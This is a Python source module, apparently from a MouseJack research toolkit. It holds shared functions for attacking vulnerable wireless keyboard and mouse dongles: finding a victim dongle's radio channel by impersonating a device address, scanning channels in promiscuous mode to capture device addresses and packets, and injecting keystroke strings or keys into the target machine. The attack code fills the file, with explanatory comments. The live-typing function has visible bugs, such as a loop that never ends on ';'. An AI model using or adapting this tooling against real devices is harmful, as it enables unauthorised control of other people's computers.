"""
This file contains utilities and functionalities common to all vendors,
including scanning, channel sweeping and generic attack functions.
"""

# no problem doing relative imports since this file should not be executed
from .hid_scan_codes import *
from . import logitech
import time
from pynput import keyboard

# constants
PING_PAYLOAD = [0x0F, 0x0F, 0x0F, 0x0F] # the arbitrary ping payload used in find_frequency_channel()
CHANNELS = range(2, 84) # the range of channels for channel sweeping and scanning (why this range was chosen is explained in find_frequency_channel())
DWELL_TIME = 0.1 # how long (in seconds) the radio listens for packets per channel, in scan()

def find_frequency_channel(radio, address):
    """
    This function receives a radio parameter (can either be a RadioServer for remote attack, or nrf24 for local attack)
    and an RF address of a vulnerable device. It identifies the frequency channel used by the victim dongle to communicate with that device,
    by pretending to be that device (since we have its address), and repeatedly sending an arbitrary "ping" payload to the victim dongle, using a different channel each time.
    The function continues with this process until an ACK is received from the dongle, meaning we found the right channel.
    It returns the channel if one was found, and None otherwise.
    This step has to be performed before any attack, since the attacking dongle must be on the same channel as the victim dongle in order to communicate with it.
    """

    print('pinging...')

    # We need to enter sniffer mode because this is the only way to tell the attacking dongle which address to use
    # when transmitting a payload. Note that this has nothing to do with sniffing keystrokes for keylogging purposes.
    radio.enter_sniffer_mode(address)
    
    # The nRF24LU1 chip provides 126 channels of 1MHz from 2400MHz to 2525MHz, so the channel parameter can be between 0 and 125 (inclusive).
    # But we don't need to scan all of these channels - the MouseJack whitepaper contains a Radio Configuration table for each affected vendor.
    # The tables contain the range of channels used by each vendor. The smallest used frequency among all vendors is 2402, and the greatest one
    # is 2481. So we can expect the channels to be between 2 and 81, thus reducing scanning time (for Logitech Unifying, the bound is even tighter -
    # 2402 - 2474).
    # To be more safe, an upper bound of 84 is used, based on: https://github.com/BastilleResearch/nrf-research-firmware/blob/master/tools/lib/common.py#L33
    for channel in CHANNELS:
        radio.set_channel(channel)
        if radio.transmit_payload(PING_PAYLOAD): # transmitting the payload; the function returns true if a response was received
            print(f'found channel: {channel}')
            return channel
    return None

def add_key_releases(keystrokes):
    """
    This function receives a list of keystrokes (meaning a list where each element is a list of the form: [scan_code, modifier])
    that are about to be injected to a vulnerable dongle.
    It tries to find consecutive pairs of keystrokes (meaning, one is to be transmitted immediately after the other) where,
    if we would type them on a keyboard in real life, we would press the same physical key (twice in a row).
    In this case, the vulnerable dongle would not tell the target computer that the key was pressed twice, unless a key release packet is placed between the original two.
    So this function adds key release packets wherever necessary.
    To indicate whether two consecutive keys with the same PHYSICAL LOCATION are pressed, we need to compare their scan codes ONLY and not their modifiers,
    because scan codes correspond to the physical location of a key on the keyboard, NOT what it says on the key itself.
    For example, the sequence 'gG' is considered as pressing the same key twice in a row, since 'g' and 'G' have the same scan code,
    even though their modifiers are different.
    """
    new_keystrokes = []
    for i in range(len(keystrokes) - 1): # in order to not go out of range
        new_keystrokes.append(keystrokes[i]) # copying each keystroke from the original list
        if keystrokes[i][0] == keystrokes[i + 1][0]: # checking if the next keystroke has the same scan code
            new_keystrokes.append([KEY_RELEASE, KEY_MOD_NONE]) # adding a key release 
    new_keystrokes.append(keystrokes[-1]) # copying the last keystroke
    return new_keystrokes

def transmit_string_while_writing(radio, vendor=logitech):
    """
    This function will listen to the client keyboard and for each key press will transmit that key
    """
    print('For each key will be pressed it will be transmited\nNOTE: to end transmit click ";"')
    while True:
        with keyboard.Events() as events:
            # Block for as much as possible
            event = events.get(1e6)
            if event.key == keyboard.KeyCode.from_char(';'):
                print('DONE Transmiting')
            transmit_string(radio=radio, s=str(event.key), vendor=vendor)

def transmit_string(radio, s, vendor=logitech):
    """
    This function receives a radio parameter (can either be a RadioServer for remote attack, or nrf24 for local attack),
    a string to be injected and the vendor of the vulnerable device. It injects the string to the victim.
    """
    keystrokes = [printable_characters[char] for char in s] # using the printable_characters dictionary from hid_scan_codes.py to get a list of keystrokes matching the characters
    vendor.inject_keystrokes(radio, add_key_releases(keystrokes)) # calling the vendor's function to inject keystrokes, adding key release packets using the utility function if necessary

def transmit_keys(radio, keys, vendor=logitech):
    """
    This function receives a radio parameter (can either be a RadioServer for remote attack, or nrf24 for local attack),
    a list of keys to be injected and the vendor of the vulnerable device. It injects the keys to the victim, one by one.
    Important note: only multimedia keys or keys that don't produce a character are allowed. For printable characters, use transmit_string().
    """
    keystrokes = [other_keys[name] for name in keys if name in other_keys.keys()] # using the other_keys dictionary (that's why characters are not allowed), eliminating key names that aren't in the dictionary
    vendor.inject_keystrokes(radio, add_key_releases(keystrokes)) # calling the vendor's function to inject keystrokes, adding key release packets using the utility function if necessary

def scan(radio, duration=20):
    """
    This function receives a radio parameter (can either be a RadioServer for remote attack, or nrf24 for local attack)
    and the duration of the scanning process (in seconds). It performs a scan that detects radio packets transmitted from vulnerable devices,
    by using the promiscuous mode implemented in the firmware, that allows the attacking dongle to receive any valid frame from any address.
    """

    radio.enter_promiscuous_mode() # sending a command to enter promiscuous mode

    # starting from the first channel
    channel_index = 0
    radio.set_channel(CHANNELS[channel_index])

    last_channel_switch = time.time() # variable to store the last time the radio switched to another channel (time.time() returns the current time)
    start_time = time.time() # variable to store the time in which the scan has started
    
    while time.time() - start_time < duration: # repeating as long as the time passed since the beginning of the scan has not exceeded the desired duration
        if time.time() - last_channel_switch > DWELL_TIME: # if our time on the current channel has expired, switching to the next channel
            channel_index = (channel_index + 1) % len(CHANNELS) # using mod because we may go through the entire range of channels multiple times
            radio.set_channel(CHANNELS[channel_index])
            last_channel_switch = time.time() # updating the variable
            
        value = radio.receive_payload() # trying to receive a payload on the current channel
        if len(value) >= 5: # meaning that the packet at least contains an RF address
            address, payload = value[0:5], value[5:] # splitting the packet - address is first 5 bytes, payload is the rest
            if len(payload) > 0: # some packets containing only an address without a payload have been observed, so we don't want to print them
                print(f"address: {format_bytes(address)}    packet: {format_bytes(payload)}")

def format_bytes(data):
    # e.g. the payload: [0x00, 0xC1, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3B] is formatted as: 00:C1:00:04:00:00:00:00:00:3B
    return ':'.join('{:02X}'.format(b) for b in data)

def address_str_to_bytes(rf_address):
    # e.g. E4:ED:AE:B8:B4 is converted to: [0xB4, 0xB8, 0xAE, 0xED, 0xE4]
    return list(bytes.fromhex(rf_address.replace(':', '')))[::-1]
